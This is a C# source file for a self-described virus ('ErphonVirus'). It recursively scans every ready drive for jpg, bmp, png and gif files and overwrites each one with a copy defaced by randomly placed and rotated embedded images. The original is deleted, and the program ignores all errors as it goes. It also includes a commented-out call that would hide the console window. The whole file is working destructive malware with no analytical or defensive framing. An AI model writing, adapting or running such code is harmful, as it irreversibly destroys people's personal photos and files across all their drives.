using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Mime;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace ErphonVirus
{
    class Program
    {
        private const int MIN_IMG_COUNT = 10;
        private const int MAX_IMG_COUNT = 30;

        static void Main(string[] args)
        {
            //Environment.Exit(0); // im gonna run this by accident
            var cnslHndl = GetConsoleWindow();
            //ShowWindow(cnslHndl, SW_HIDE);

            Image[] erphonImages = {
                Properties.Resources.e1,
                Properties.Resources.e2,
                Properties.Resources.e3 };
            Random rnd = new Random();
            
            var drives = from drive in DriveInfo.GetDrives()
                         where drive.IsReady
                         select drive;
            foreach (DriveInfo driveInfo in drives)
            {
                var drive = driveInfo.RootDirectory;
                Stack<string> searchDirectories = new Stack<string>();
                searchDirectories.Push(drive.FullName);
                while (searchDirectories.Count > 0)
                {
                    string currentDirectoryInfo = searchDirectories.Pop();
                    try
                    {
                        foreach (string childDirectoryInfo in Directory.EnumerateDirectories(currentDirectoryInfo))
                            searchDirectories.Push(childDirectoryInfo);
                        foreach (string childFileInfo in Directory.EnumerateFiles(currentDirectoryInfo))
                        {
                            if (childFileInfo.EndsWith("jpg") || childFileInfo.EndsWith("bmp") ||
                                childFileInfo.EndsWith("png") || childFileInfo.EndsWith("gif"))
                            {
                                try
                                {
                                    Erphonize(childFileInfo, erphonImages, rnd);
                                    Console.WriteLine(childFileInfo);
                                }
                                catch
                                {
                                    // ignored
                                }
                            }
                        }
                    }
                    catch
                    {
                        // ignored
                    }
                }
            }
        }

        public static void Erphonize(string childFileInfo, Image[] erphonImages, Random rnd)
        {
            using (Image image = Image.FromFile(childFileInfo))
            {
                using (Graphics g = Graphics.FromImage(image))
                {
                    int rndAmount = rnd.Next(MAX_IMG_COUNT - MIN_IMG_COUNT) + MIN_IMG_COUNT;
                    for (int i = 0; i < rndAmount; i++)
                    {
                        Image rndImage = erphonImages[rnd.Next(erphonImages.Length)];
                        int w = rnd.Next(image.Width)/3;
                        int h = rnd.Next(image.Height)/3;
                        int x = rnd.Next(image.Width - w);
                        int y = rnd.Next(image.Height - h);
                        int ang = rnd.Next(360);
                        g.TranslateTransform(x, y);
                        g.RotateTransform(ang);
                        g.TranslateTransform(-x, -y);
                        g.DrawImage(rndImage,
                            new Rectangle(x, y, w, h));
                        g.TranslateTransform(x, y);
                        g.RotateTransform(-ang);
                        g.TranslateTransform(-x, -y);
                    }
                    image.Save(childFileInfo + ".bak");
                }
            }
            File.Delete(childFileInfo);
            File.Move(childFileInfo + ".bak", childFileInfo);
        }
        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);


    }
}
